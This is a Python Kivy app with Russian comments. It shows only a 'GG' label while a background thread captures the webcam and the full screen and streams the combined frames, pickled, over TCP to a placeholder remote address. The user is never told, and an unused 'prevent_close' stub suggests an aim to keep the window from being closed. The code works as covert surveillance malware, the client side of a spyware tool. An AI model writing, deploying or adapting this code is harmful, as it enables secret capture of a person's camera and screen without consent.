from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
import cv2
import numpy as np
import socket
import pickle
import struct
import threading
import mss

# Настройки
SERVER_IP = 'your_ip'
SERVER_PORT = 5000

class StreamApp(App):
    def build(self):
        # Основной макет
        self.layout = BoxLayout(orientation='vertical')

        # Метка с надписью "GG"
        self.status_label = Label(text="GG", font_size=50)
        self.layout.add_widget(self.status_label)

        # Запуск потока стриминга в фоновом режиме
        self.stream_thread = threading.Thread(target=self.stream_data)
        self.stream_thread.daemon = True
        self.stream_thread.start()

        return self.layout

    def on_stop(self):
        # Закрываем поток, когда приложение останавливается
        self.stop_streaming()

    def prevent_close(self, *args):
        # Возвращаем False, чтобы предотвратить закрытие окна
        return True

    def get_screen_frame(self):
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Выбираем основной монитор
            screenshot = sct.grab(monitor)
            frame = np.array(screenshot)
            return frame

    def stream_data(self):
        # Создаем сокет
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))

        # Захват с камеры
        camera = cv2.VideoCapture(0)

        try:
            while True:
                # Захват кадра с камеры
                ret_cam, frame_cam = camera.read()
                if not ret_cam:
                    continue

                # Захват кадра с экрана
                frame_screen = self.get_screen_frame()

                # Приводим изображение с экрана к формату RGB (если оно в RGBA)
                if frame_screen.shape[2] == 4:
                    frame_screen_rgb = cv2.cvtColor(frame_screen, cv2.COLOR_RGBA2RGB)
                else:
                    frame_screen_rgb = frame_screen

                # Изменяем размер кадра с экрана до размера кадра с камеры
                frame_screen_resized = cv2.resize(frame_screen_rgb, (frame_cam.shape[1], frame_cam.shape[0]))

                # Комбинируем кадры с камеры и экрана
                combined_frame = np.hstack((frame_cam, frame_screen_resized))

                # Сжимаем и отправляем кадры на сервер
                data = pickle.dumps(combined_frame)
                message_size = struct.pack("I", len(data))
                client_socket.sendall(message_size + data)

        except Exception as e:
            print(f'Ошибка стриминга: {e}')
        finally:
            camera.release()
            client_socket.close()

    def stop_streaming(self):
        # Останавливаем поток стриминга и закрываем ресурсы
        self.stream_thread.join()  # Ожидаем завершения потока

if __name__ == '__main__':
    StreamApp().run()
